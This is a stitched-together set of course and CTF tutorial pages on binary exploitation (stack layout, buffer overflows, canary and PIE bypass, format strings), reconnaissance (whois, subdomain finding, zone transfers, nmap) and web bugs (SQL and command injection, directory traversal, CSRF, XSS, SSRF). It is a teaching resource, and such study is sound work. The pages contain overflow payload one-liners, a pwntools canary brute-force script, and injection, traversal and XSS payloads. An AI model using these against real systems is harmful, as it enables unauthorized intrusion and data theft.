A small Python one-liner will work nicely: python -c \"print 'A'*100 + '\\x31\\x13\\x00\\x00'\" This will fill the name buffer with 100 'A's, then overwrite secret with the 32-bit little-endian encoding of 0x1337.","title":"Passing an impossible check"},{"location":"CS315/Week%202/#going-one-step-further","text":"As discussed on the stack page, the instruction that the current function should jump to when it is done is also saved on the stack (denoted as \"Saved EIP\" in the above stack diagrams). If we can overwrite this, we can control where the program jumps after main finishes running, giving us the ability to control what the program does entirely. Usually, the end objective in binary exploitation is to get a shell (often called \"popping a shell\") on the remote computer. The shell provides us with an easy way to run anything we want on the target computer. Say there happens to be a nice function that does this defined somewhere else in the program that we normally can't get to: void give_shell() { system(\"/bin/sh\"); } Well with our buffer overflow knowledge, now we can! All we have to do is overwrite the saved EIP on the stack to the address where give_shell is. Then, when main returns, it will pop that address off of the stack and jump to it, running give_shell , and giving us our shell. Assuming give_shell is at 0x08048fd0, we could use something like this: python -c \"print 'A'*108 + '\\xd0\\x8f\\x04\\x08'\" We send 108 'A's to overwrite the 100 bytes that is allocated for name , the 4 bytes for secret , and the 4 bytes for the saved EBP.

For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Common topics addressed by Binary Exploitation or 'pwn' challenges include: Registers The Stack Calling Conventions Global Offset Table (GOT) Buffers Buffer Overflow Return Oriented Programming (ROP) Binary Security No eXecute (NX) Address Space Layout Randomization (ASLR) Stack Canaries Relocation Read-Only (RELRO) The Heap Heap Exploitation Format String Vulnerability The Stack In computer architecture, the stack is a hardware manifestation of the stack data structure (a Last In, First Out queue). In x86, the stack is simply an area in RAM that was chosen to be the stack - there is no special hardware to store stack contents. The esp / rsp register holds the address in memory where the bottom of the stack resides. When something is push ed to the stack, esp decrements by 4 (or 8 on 64-bit x86), and the value that was push ed is stored at that location in memory. Likewise, when a pop instruction is executed, the value at esp is retrieved (i.e. esp is dereferenced), and esp is then incremented by 4 (or 8). N.B. The stack \"grows\" down to lower memory addresses! Conventionally, ebp / rbp contains the address of the top of the current stack frame , and so sometimes local variables are referenced as an offset relative to ebp rather than an offset to esp . A stack frame is essentially just the space used on the stack by a given function. Uses The stack is primarily used for a few things: Storing function arguments Storing local variables Storing processor state between function calls Example Let's see what the stack looks like right after say_hi has been called in this 32-bit x86 C program: #include <stdio.h> void say_hi(const char * name) { printf(\"Hello %s!\\n\", name); } int main(int argc, char ** argv) { char * name; if (argc != 2) { return 1; } name = argv[1]; say_hi(name); return 0; } And the relevant assembly: 0804840b <say_hi>: 804840b: 55 push ebp 804840c: 89 e5 mov ebp,esp 804840e: 83 ec 08 sub esp,0x8 8048411: 83 ec 08 sub esp,0x8 8048414: ff 75 08 push DWORD PTR [ebp+0x8] 8048417: 68 f0 84 04 08 push 0x80484f0 804841c: e8 bf fe ff ff call 80482e0 <printf@plt> 8048421: 83 c4 10 add esp,0x10 8048424: 90 nop 8048425: c9 leave 8048426: c3 ret 08048427 <main>: 8048427: 8d 4c 24 04 lea ecx,[esp+0x4] 804842b: 83 e4 f0 and esp,0xfffffff0 804842e: ff 71 fc push DWORD PTR [ecx-0x4] 8048431: 55 push ebp 8048432: 89 e5 mov ebp,esp 8048434: 51 push ecx 8048435: 83 ec 14 sub esp,0x14 8048438: 89 c8 mov eax,ecx 804843a: 83 38 02 cmp DWORD PTR [eax],0x2 804843d: 74 07 je 8048446 <main+0x1f> 804843f: b8 01 00 00 00 mov eax,0x1 8048444: eb 1c jmp 8048462 <main+0x3b> 8048446: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 8048449: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 804844c: 89 45 f4 mov DWORD PTR [ebp-0xc],eax 804844f: 83 ec 0c sub esp,0xc 8048452: ff 75 f4 push DWORD PTR [ebp-0xc] 8048455: e8 b1 ff ff ff call 804840b <say_hi> 804845a: 83 c4 10 add esp,0x10 804845d: b8 00 00 00 00 mov eax,0x0 8048462: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 8048465: c9 leave 8048466: 8d 61 fc lea esp,[ecx-0x4] 8048469: c3 ret Skipping over the bulk of main , you'll see that at 0x8048452 main 's name local is pushed to the stack because it's the first argument to say_hi . Then, a call instruction is executed. call instructions first push the current instruction pointer to the stack, then jump to their destination. So when the processor begins executing say_hi at 0x0804840b , the stack looks like this: EIP = 0x0804840b (push ebp) ESP = 0xffff0000 EBP = 0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 ESP -> 0xffff0000: 0x0804845a // Return address for say_hi The first thing say_hi does is save the current ebp so that when it returns, ebp is back where main expects it to be. The stack now looks like this: EIP = 0x0804840c (mov ebp, esp) ESP = 0xfffefffc EBP = 0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi ESP -> 0xfffefffc: 0xffff002c // Saved EBP Again, note how esp gets smaller when values are pushed to the stack. Next, the current esp is saved into ebp , marking the top of the new stack frame. EIP = 0x0804840e (sub esp, 0x8) ESP = 0xfffefffc EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi ESP, EBP -> 0xfffefffc: 0xffff002c // Saved EBP Then, the stack is \"grown\" to accommodate local variables inside say_hi .

EIP = 0x0804845a (add esp, 0x10) ESP = 0xffff0000 EBP = 0xffff002c ESP -> 0xffff0004: 0xffffa0a0 // say_hi argument 1 Calling Conventions To be able to call functions, there needs to be an agreed-upon way to pass arguments. If a program is entirely self-contained in a binary, the compiler would be free to decide the calling convention. However in reality, shared libraries are used so that common code (e.g. libc) can be stored once and dynamically linked in to programs that need it, reducing program size. In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit cdecl In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this: int add(int a, int b, int c) { return a + b + c; } would be invoked by pushing c , then b , then a . SysV For 64-bit binaries, function arguments are first passed in certain registers: RDI RSI RDX RCX R8 R9 then any leftover arguments are pushed onto the stack in reverse order, as in cdecl. Other Conventions Any method of passing arguments could be used as long as the compiler is aware of what the convention is. As a result, there have been many calling conventions in the past that aren't used frequently anymore. See Wikipedia for a comprehensive list. Binary Security Binary Security is using tools and methods in order to secure programs from being manipulated and exploited. This tools are not infallible, but when used together and implemented properly, they can raise the difficulty of exploitation greatly. No eXecute (NX Bit) The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code. This is significant because it prevents attackers from being able to jump to custom shellcode that they've stored on the stack or in a global variable. Checking for NX You can either use pwntools' checksec or rabin2 . $ checksec vuln [*] 'vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments $ rabin2 -I vuln [...] nx false [...] Address Space Layout Randomization (ASLR) Address Space Layout Randomization (or ASLR) is the randomization of the place in memory where the program, shared libraries, the stack, and the heap are. This makes can make it harder for an attacker to exploit a service, as knowledge about where the stack, heap, or libc can't be re-used between program launches. This is a partially effective way of preventing an attacker from jumping to, for example, libc without a leak. Typically, only the stack, heap, and shared libraries are ASLR enabled. It is still somewhat rare for the main program to have ASLR enabled, though it is being seen more frequently and is slowly becoming the default. Stack Canaries Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately. Bypassing Stack Canaries Stack Canaries seem like a clear cut way to mitigate any stack smashing as it is fairly impossible to just guess a random 64-bit value. However, leaking the address and bruteforcing the canary are two methods which would allow us to get through the canary check. Stack Canary Leaking If we can read the data in the stack canary, we can send it back to the program later because the canary stays the same throughout execution. However Linux makes this slightly tricky by making the first byte of the stack canary a NULL, meaning that string functions will stop when they hit it. A method around this would be to partially overwrite and then put the NULL back or find a way to leak bytes at an arbitrary stack offset. A few situations where you might be able to leak a canary: User-controlled format string User-controlled length of an output \u201cHey, can you send me 1000000 bytes? thx!\u201d Bruteforcing a Stack Canary The canary is determined when the program starts up for the first time which means that if the program forks, it keeps the same stack cookie in the child process. This means that if the input that can overwrite the canary is sent to the child, we can use whether it crashes as an oracle and brute-force 1 byte at a time! This method can be used on fork-and-accept servers where connections are spun off to child processes, but only under certain conditions such as when the input accepted by the program does not append a NULL byte ( read or recv ). Buffer (N Bytes) ?? ?? ?? ?? ?? ?? ?? ?? RBP RIP Fill the buffer N Bytes + 0x00 results in no crash Buffer (N Bytes) 00 ?? ?? ?? ?? ?? ?? ?? RBP RIP Fill the buffer N Bytes + 0x00 + 0x00 results in a crash N Bytes + 0x00 + 0x01 results in a crash N Bytes + 0x00 + 0x02 results in a crash ... N Bytes + 0x00 + 0x51 results in no crash Buffer (N Bytes) 00 51 ?? ?? ?? ?? ?? ?? RBP RIP Repeat this bruteforcing process for 6 more bytes... Buffer (N Bytes) 00 51 FE 0A 31 D2 7B 3C RBP RIP Now that we have the stack cookie, we can overwrite the RIP register and take control of the program! Relocation Read-Only (RELRO) Relocation Read-Only (or RELRO) is a security measure which makes some binary sections read-only. There are two RELRO \"modes\": partial and full. Partial RELRO Partial RELRO is the default setting in GCC, and nearly all binaries you will see have at least partial RELRO. From an attackers point-of-view, partial RELRO makes almost no difference, other than it forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries. Full RELRO Full RELRO makes the entire GOT read-only which removes the ability to perform a \"GOT overwrite\" attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run. Full RELRO is not a default compiler setting as it can greatly increase program startup time since all symbols must be resolved before the program is started. In large programs with thousands of symbols that need to be linked, this could cause a noticable delay in startup time. Bypassing Canary & PIE If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to bypass them. Canary The best way to bypass a simple canary is if the binary is a program forking child processes every time you establish a new connection with it (network service), because every time you connect to it the same canary will be used . Then, the best way to bypass the canary is just to brute-force it char by char , and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. In this example the function brute-forces an 8 Bytes canary (x64) and distinguish between a correct guessed byte and a bad byte just checking if a response is sent back by the server (another way in other situation could be using a try/except ): from pwn import * def connect(): r = remote(\"localhost\", 8788) def get_bf(base): canary = \"\" guess = 0x0 base += canary while len(canary) < 8: while guess != 0xff: r = connect() r.recvuntil(\"Username: \") r.send(base + chr(guess)) if \"SOME OUTPUT\" in r.clean(): print \"Guessed correct byte:\", format(guess, '02x') canary += chr(guess) base += chr(guess) guess = 0x0 r.close() break else: guess += 1 r.close() print \"FOUND:\\\\x\" + '\\\\x'.join(\"{:02x}\".format(ord(c)) for c in canary) return base canary_offset = 1176 base = \"A\" * canary_offset print(\"Brute-Forcing canary\") base_canary = get_bf(base) #Get yunk data + canary CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary PIE In order to bypass the PIE you need to leak some address . And if the binary is not leaking any addresses the best to do it is to brute-force the RBP and RIP saved in the stack in the vulnerable function. For example, if a binary is protected using both a canary and PIE , you can start brute-forcing the canary, then the next 8 Bytes (x64) will be the saved RBP and the next 8 Bytes will be the saved RIP. To brute-force the RBP and the RIP from the binary you can figure out that a valid guessed byte is correct if the program output something or it just doesn't crash. The same function as the provided for brute-forcing the canary can be used to brute-force the RBP and the RIP: print(\"Brute-Forcing RBP\") base_canary_rbp = get_bf(base_canary) RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:]) print(\"Brute-Forcing RIP\") base_canary_rbp_rip = get_bf(base_canary_rbp) RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:]) Get base address The last thing you need to defeat the PIE is to calculate useful addresses from the leaked addresses: the RBP and the RIP . From the RBP you can calculate where are you writing your shell in the stack . This can be very useful to know where are you going to write the string \"/bin/sh\\x00\" inside the stack. To calculate the distance between the leaked RBP and your shellcode you can just put a breakpoint after leaking the RBP an check where is your shellcode located , then, you can calculate the distance between the shellcode and the RBP: INI_SHELLCODE = RBP - 1152 From the RIP you can calculate the base address of the PIE binary which is what you are going to need to create a valid ROP chain . To calculate the base address just do objdump -d vunbinary and check the disassemble latest addresses: In that example you can see that only 1 Byte and a half is needed to locate all the code, then, the base address in this situation will be the leaked RIP but finishing on \"000\" . For example if you leaked 0x562002970 ecf the base address is 0x562002970**000 elf.address = RIP - (RIP & 0xfff) Format String Vulnerability A format string vulnerability is a bug where user input is passed as the format argument to printf , scanf , or another function in that family. The format argument has many different specifies which could allow an attacker to leak data if they control the format argument to printf . Since printf and similar are variadic functions, they will continue popping data off of the stack according to the format. For example, if we can make the format argument \"%x.%x.%x.%x\", printf will pop off four stack values and print them in hexadecimal, potentially leaking sensitive information. printf can also index to an arbitrary \"argument\" with the following syntax: \"%n$x\" (where n is the decimal index of the argument you want). While these bugs are powerful, they're very rare nowadays, as all modern compilers warn when printf is called with a non-constant string. Example #include <stdio.h> #include <unistd.h> int main() { int secret_num = 0x8badf00d; char name[64] = {0}; read(0, name, 64); printf(\"Hello \"); printf(name); printf(\"! You'll never get my secret!\\n\"); return 0; } Due to how GCC decided to lay out the stack, secret_num is actually at a lower address on the stack than name , so we only have to go to the 7th \"argument\" in printf to leak the secret: $ ./fmt_string %7$llx Hello 8badf00d3ea43eef ! You'll never get my secret! Exercise (5 pt) \"Gimme the report.\" The Boss said CS315 course is open, and this year we added some CTF challenges to the lab tutorial.

The recon-phase is usually divided up into two phases. Passive information gathering / OSINT This is when you check out stuff like: Web information Email Harvesting Whois enumeration Active information gathering This is when you start scanning the target with your different tools. Passive information gathering It is passive in the meaning that it doesn't directly send packets to the service. But in any other sense of the word there is nothing passive about this phase. Visit the website Okay, I guess this actually sends packets to the target, but whatever. Visit the page, look around, read about the target. What do they do? Whois Find out who is behind the website. Resolve the DNS host website.com nslookup website.com The the IP address and check it with whois whois 192.168.1.101 Netcraft Most of the info found on netcraft is not unique. It is basic whois info. But one thing is really good, it lists the different IP-addresses the page has had over the years. This can be a good way to bypass cloudflare and other services that hide the real IP. Using netcraft we can find the IP that was in use before they implemented cloudflare. Another detail that is good to know is the hosting-company or domain-provider . Those details can be used if we want to try some social-engineering or spear-phishing attack . Netcraft Find Subdomains Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success.

Form the highest to the lowest level. An introduction to dns-terminology components and concepts Before we begin to look at the specific techniques that exists to find subdomains, lets try to understand what subdomains are and how they work. A - records A stands for address . The A record maps a name to one or more IP addresses, when the IP are known and stable. So that would be 123.244.223.222 => example.com AAAA - points to a IPv6 Record CNAME The CNAME record connects a name to another name. An example of that would be: www.example.com,CNAME,www.example.com.cdn.cloudflare.net. Another example is. If you have the domains mail.example.com and webmail.example.com. You can have webmail.example.com point to mail.example.com. So anyone visiting webmail.example.com will see the same thing as mail.example.com. It will NOT redirect you. Just show you the same content. Another typical usage of CNAME is to link www.example.com to example.com CNAME is quite convenient. Because if you change the A-record. The IP-address, you don't need to change the other subdomains, like ftp.example.com or www.example.com. Since they both point to example.com, which is a A-record and points directly to the IP. Another note. If foo.example.com points to bar.example.com, that mean that bar.example.com is the CNAME (Canonical/real/actual Name) of foo.example.com. Alias Kind of like CNAME in that it points to another name, not an IP. MX - Mail exchange https://en.wikipedia.org/wiki/MX_record Find Subdomains Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success. For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains Some tools find some stuff, other tools other stuff. So your best bet is to use a few of them together. Don't forget to brute-force recursively! recon-ng In order to find subdomains we can use the recon-ng framework. It has the same basic structure as metasploit. You can learn more about this tool in the tools-section. recon-ng use use recon/domains-hosts/ # This will give you a vast amount of alternatives. show options set source cnn.com All these subdomains will be saved in hosts , which you can access though: show hosts If some of these subdomains are not given IPs automatically you can just run use recon/hosts-hosts/resolve run And it will resolve all the hosts in the hosts-file. Google Dorks Using google we can also find subdomains. This will only give us the subdomains of a site. site:msn.com -site:www.msn.com site:*.nextcloud.com To exclude a specific subdomain you can do this: site:*.nextcloud.com -site:help.nextcloud.com subbrute.py The basic command is like this ./subbrute.py -p cnn.com https://github.com/TheRook/subbrute Knock I haven't tested this yet. https://github.com/guelfoweb/knock Being smart You also have to look at what kind of system the target has. Some web-apps give their clients their own subdomains. Like github. Check out the homepage Often companies brag about their clients. You can use this to guess the subdomains of some clients. Reverse DNS-lookup If you manage to figure out the IP range that the target owns (see section about nmap below). You can see which machines are online. And then you can run a script to find out the domain-addresses of those machines. That way you might find something new.

The DNS server contains a Zone file which it uses to replicate the map of a domain. They should be configured so that only the replicating DNS-server can access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve the whole list of subdomains. This can be done the following way: To do this we first need to figure out which DNS-servers a domain has. host -t ns wikipedia.com host -l wikipedia.com ns1.wikipedia.com This can also be done with tools such as dnsrecon and dnsenum. https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack Search Engine Discovery Search engines can be very useful for finding information about the target. Search engines can be used for two things: Finding sensitive information on the domain that you are attacking Finding sensitive information about the company and its employees in on other parts of the internet. Like forums, newsgroups etc. Remember that the world is bigger than google. So test out the other search engines. Baidu, binsearch.info, Bing, DuckDuckGo, ixquick/Startpage, Shodan,PunkSpider Google is a good tool to learn more about a website. Finding specific filetypes filetype:pdf Search within webaddress site:example.com myword Find in url inurl:test.com Wild cards You can use the asterisk to as a wildcard: * Example: \"I've been * for a heart\" This will return answers where * is anything. Exclude words - the dash excludes a specific word This query searches for pages that used the word bananasplit. -banana bananasplit Cached version So if a website has been taken down you can still find the cached version, of the last time google visited the site cache:website.com https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf Examples Find login-pages on sites that use the ending .bo. For bolivia. site:bo inurl:admin.php Active information gathering Once the passive phase is over it is time to move to the active phase. In this phase we start interacting with the target. Netdiscover This tool is used to scan a network for live machines. netdiscover -r 192.168.1.1/24 Nikto Nikto is a good tool to scan webservers. It is very intrusive. nikto -host 192.168.1.101 Port Scanning TLDR # Stealthy nmap -sS 10.11.1.X # Scan all ports, might take a while. nmap 10.11.1.X -p- # Scan for UDP nmap 10.11.1.X -sU unicornscan -mU -v -I 10.11.1.X # Scan for version, with NSE-scripts and trying to identify OS nmap 10.11.1.X -sV -sC -O # All out monsterscan nmap -vvv -Pn -A -iL listOfIP.txt # Fast scan nmap 10.11.1.X -F # Only scan the 100 most common ports nmap 10.11.1.X --top-ports 100 Nmap Now that you have gathered some IP addresses from your subdomain scanning it is time to scan those addresses. You just copy-paste those addresses and add them to a file, line by line. Then you can scan all of them with nmap at the same time. Using the -iL flag. Basics - tcp-connect scan Okay, so a bit of the basics of Nmap and how it works. When one machine initiate a connection with another machine using the transmission-control protocol (tcp) it performs what is know as a three-way handshake. That means: machine1 sends a syn packet to machine2 machine2 send a syn-ack packet to machine1 machine1 sends a ack packet to machine2. If machine2 responds with a syn-ack we know that that port is open. This is basically what nmap does when it scans for a port. If machine1 omits the last ack packet the connection is not made. This can be a way to make less noise. This is the default mode for nmap. If you do not add any flags and scan a machine this is the type of connection it creates. \"Stealthy\" -sS By adding the -sS flag we are telling nmap to not finalize the three way handshake. It will send a syn , receive syn-ack (if the port is open), and then terminate the connection. This used to be considered stealthy before, since it was often not logged. However it should not be considered stealthy anymore. In the flag I imagine that the first s stands for scan/scantype and the second S stands for syn . So -sS can be read as scantype syn UDP scan UDP is after TCP the most common protocol. DNS (53), SNMP (161/162) and DHCP (67/68) are some common ones. Scanning for it is slow and unreliable. -sU Output scan to a textfile Not all output works with grepable format. For example NSE does not work with grepable. So you might want to use xml instead. # To text-file -oN nameOfFile # To grepable format -oG nameOfFile # To xml -oX nameOfFile Scan an entire IP-range You might find that a site has several machines on the same ip-range. You can then use nmap to scan the whole range. The -sn flag stops nmap from running port-scans. So it speeds up the process. nmap -vvv -sn 201.210.67.0/24 You can also specify a specific range, like this nmap -sP 201.210.67.0-100 ` Sort out the machines that are up So let's say you find that 40 machine exists in that range. We can use grep to output those IP:s. First let's find the IPs that were online. Ip-range is the output from previous command. You can of course combine them all. cat ip-range.txt | grep -B 1 \"Host is up\" Now let's sort out the ips from that file. grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' ip-range.txt > only-ip.txt Now you can input all those ips to nmap and scan them. Scan a range and output if a specific port is open Nmap has a command to make the output grepable. nmap -vvv -p 80 201.210.67.0-100 -oG - | grep 80/open Nmap scripts This chapter could also be placed in Vulnerability-analysis and Exploitation.

An introduction to dns-terminology components and concepts Before we begin to look at the specific techniques that exists to find subdomains, lets try to understand what subdomains are and how they work. A - records A stands for address . The A record maps a name to one or more IP addresses, when the IP are known and stable. So that would be 123.244.223.222 => example.com AAAA - points to a IPv6 Record CNAME The CNAME record connects a name to another name. An example of that would be: www.example.com,CNAME,www.example.com.cdn.cloudflare.net. Another example is. If you have the domains mail.example.com and webmail.example.com. You can have webmail.example.com point to mail.example.com. So anyone visiting webmail.example.com will see the same thing as mail.example.com. It will NOT redirect you. Just show you the same content. Another typical usage of CNAME is to link www.example.com to example.com CNAME is quite convenient. Because if you change the A-record. The IP-address, you don't need to change the other subdomains, like ftp.example.com or www.example.com. Since they both point to example.com, which is a A-record and points directly to the IP. Another note. If foo.example.com points to bar.example.com, that mean that bar.example.com is the CNAME (Canonical/real/actual Name) of foo.example.com.

While there are specific vulnerabilities in each programming language that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework. These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privilege. Common vulnerabilities to see in CTF challenges: SQL Injection Command Injection Directory Traversal Cross Site Request Forgery Cross Site Scripting Server Side Request Forgery SQL Injection SQL Injection is a vulnerability where an application takes input from a user and doesn't validate that the user's input doesn't contain additional SQL. <?php $username = $_GET['username']; // kchung $result = mysql_query(\"SELECT * FROM users WHERE username='$username'\"); ?> If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung). But a malicious user might submit different kind of data. For example, consider if the input was ' ? The application would crash because the resulting SQL query is incorrect. SELECT * FROM users WHERE username=''' Notice the extra single quote at the end. With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection. What if our input was ' OR 1=1 ? SELECT * FROM users WHERE username='' OR 1=1 1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying SELECT * FROM users WHERE username='' OR true This will return every row in the table because each row that exists must be true. We can also inject comments and termination characters like -- or /* or ; . This allows you to terminate SQL queries after your injected statements. For example '-- is a common SQL injection payload. SELECT * FROM users WHERE username=''-- ' This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote. Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return. Command Injection Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the system() command or its equivalent in the programming language of the application. import os domain = user_input() # ctf101.org os.system('ping ' + domain) The above code when used normally will ping the ctf101.org domain. But consider what would happen if the user_input() function returned different data? import os domain = user_input() # ; ls os.system('ping ' + domain) Because of the additional semicolon, the os.system() function is instructed to run two commands. It looks to the program as: ping ; ls The semicolon terminates a command in bash and allows you to put another command after it. Because the ping command is being terminated and the ls command is being added on, the ls command will be run in addition to the empty ping command! This is the core concept behind command injection. The ls command could of course be switched with another command (e.g. wget, curl, bash, etc.) Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection. Example Payloads ;ls $(ls) ls Directory Traversal Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path. Any kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal. For example, consider an application that allows the user to choose what page to load from a GET parameter. <?php $page = $_GET['page']; // index.php include(\"/var/www/html/\" . $page); ?> Under normal operation the page would be index.php . But what if a malicious user gave in something different? <?php $page = $_GET['page']; // ../../../../../../../../etc/passwd include(\"/var/www/html/\" . $page); ?> Here the user is submitting ../../../../../../../../etc/passwd . This will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder. include(\"/var/www/html/../../../../../../../../etc/passwd\"); Ultimately this will become /etc/passwd because the computer will not go a directory above its top directory. Thus the application will load the /etc/passwd file and emit it to the user like so: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false This same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities. Cross Site Request Forgery (CSRF) A Cross Site Request Forgery or CSRF Attack, pronounced see surf , is an attack on an authenticated user which uses a state session in order to perform state changing attacks like a purchase, a transfer of funds, or a change of email address. The entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through an <img> tag or an <iframe> where references to external resources are unverified. Using CSRF GET requests are often used by websites to get user input. Say a user signs in to an banking site which assigns their browser a cookie which keeps them logged in. If they transfer some money, the URL that is sent to the server might have the pattern: http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS] Knowing this format, an attacker can send an email with a hyperlink to be clicked on or they can include an image tag of 0 by 0 pixels which will automatically be requested by the browser such as: <img src=\"http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS]\" width=\"0\" height=\"0\" border=\"0\"> Cross Site Scripting (XSS) Cross Site Scripting or XSS is a vulnerability where on user of an application can send JavaScript that is executed by the browser of another user of the same application. This is a vulnerability because JavaScript has a high degree of control over a user's web browser. For example JavaScript has the ability to: Modify the page (called the DOM) Send more HTTP requests Access cookies By combining all of these abilities, XSS can maliciously use JavaScript to extract user's cookies and send them to an attacker controlled server. XSS can also modify the DOM to phish users for their passwords. This only scratches the surface of what XSS can be used to do. XSS is typically broken down into three categories: Reflected XSS Stored XSS DOM XSS Reflected XSS Reflected XSS is when an XSS exploit is provided through a URL paramater. For example: https://ctf101.org?data=<script>alert(1)</script> You can see the XSS exploit provided in the data GET parameter. If the application is vulnerable to reflected XSS, the application will take this data parameter value and inject it into the DOM. For example: <html> <body> <script>alert(1)</script> </body> </html> Depending on where the exploit gets injected, it may need to be constructed differently. Also, the exploit payload can change to fit whatever the attacker needs it to do. Whether that is to extract cookies and submit it to an external server, or to simply modify the page to deface it. One of the deficiencies of reflected XSS however is that it requires the victim to access the vulnerable page from an attacker controlled resource. Notice that if the data paramter, wasn't provided the exploit wouldn't work. In many situations, reflected XSS is detected by the browser because it is very simple for a browser to detect malicous XSS payloads in URLs. Stored XSS Stored XSS is different from reflected XSS in one key way. In reflected XSS, the exploit is provided through a GET parameter. But in stored XSS, the exploit is provided from the website itself. Imagine a website that allows users to post comments. If a user can submit an XSS payload as a comment, and then have others view that malicious comment, it would be an example of stored XSS. The reason being that the web site itself is serving up the XSS payload to other users. This makes it very difficult to detect from the browser's perspective and no browser is capable of generically preventing stored XSS from exploiting a user. DOM XSS DOM XSS is XSS that is due to the browser itself injecting an XSS payload into the DOM. While the server itself may properly prevent XSS, it's possible that the client side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger. The server itself is not to blame, but the client side JavaScript files are causing the issue. Server Side Request Forgery (SSRF) Server Side Request Forgery or SSRF is where an attacker is able to cause a web application to send a request that the attacker defines. For example, say there is a website that lets you take a screenshot of any site on the internet. Under normal usage a user might ask it to take a screenshot of a page like Google, or The New York Times. But what if a user does something more nefarious? What if they asked the site to take a picture of http://localhost ? Or perhaps tries to access something more useful like http://localhost/server-status ? 127.0.0.1 (also known as localhost or loopback) represents the computer itself. Accessing localhost means you are accessing the computer's own internal network. Developers often use localhost as a way to access the services they have running on their own computers. Depending on what the response from the site is the attacker may be able to gain additional information about what's running on the computer itself. In addition, the requests originating from the server would come from the server's IP not the attackers IP. Because of that, it is possible that the attacker might be able to access internal resources that he wouldn't normally be able to access. Another usage for SSRF is to create a simple port scanner to scan the internal network looking for internal services. PHP PHP is one of the most used languages for back-end web development and therefore it has become a target by hackers. PHP is a language which makes it painful to be secure for most instances, making it every hacker's dream target. Overview PHP is a C-like language which uses tags enclosed by <?php ... ?> (sometimes just <? ... ?> ). It is inlined into HTML. A word of advice is to keep the php docs open because function names are strange due to the fact that the length of function name is used to be the key in PHP's internal dictionary, so 